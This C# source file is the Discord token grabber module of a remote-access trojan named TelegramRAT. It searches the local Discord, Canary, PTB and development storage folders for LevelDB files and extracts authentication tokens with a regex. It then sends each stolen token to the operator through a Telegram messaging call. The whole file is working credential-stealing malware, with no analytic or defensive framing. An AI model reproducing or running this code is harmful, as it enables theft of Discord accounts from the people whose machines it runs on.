```csharp
using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace TelegramRAT
{
    internal class DiscordGrabber
    {

        // Get token
        public static void get()
        {
            var files = SearchForFile();
            if (files.Count == 0)
            {
                telegram.sendText("⛔ Didn't find any ldb files");
                return;
            }
            foreach (string fileContent in files)
            {
                foreach (Match match in Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                {
                    telegram.sendText($"💎 Discord token: {match.Value}");
                }
            }
        }

        // Locate *.ldb files
        private static List<string> SearchForFile()
        {
            List<string> ldbFiles = new List<string>();
            string[] paths = new string[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Discord"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "discordcanary"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "discordptb"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "discorddevelopment")
            };

            foreach (string path in paths)
            {
                string dbPath = Path.Combine(path, "Local Storage", "leveldb");

                if (Directory.Exists(dbPath))
                {
                    string[] ldbFilesPaths = Directory.GetFiles(dbPath, "*.ldb", SearchOption.AllDirectories);

                    foreach (string ldbFilePath in ldbFilesPaths)
                    {
                        try
                        {
                            string fileContent = File.ReadAllText(ldbFilePath);
                            if (fileContent.Contains("oken")) // Check for a substring indicating possible token presence
                            {
                                ldbFiles.Add(fileContent);
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error reading file {ldbFilePath}: {ex.Message}");
                        }
                    }
                }
                else
                {
                    telegram.sendText($"⚠️ Path does not exist: {dbPath}");
                }
            }

            return ldbFiles;
        }
    }
}
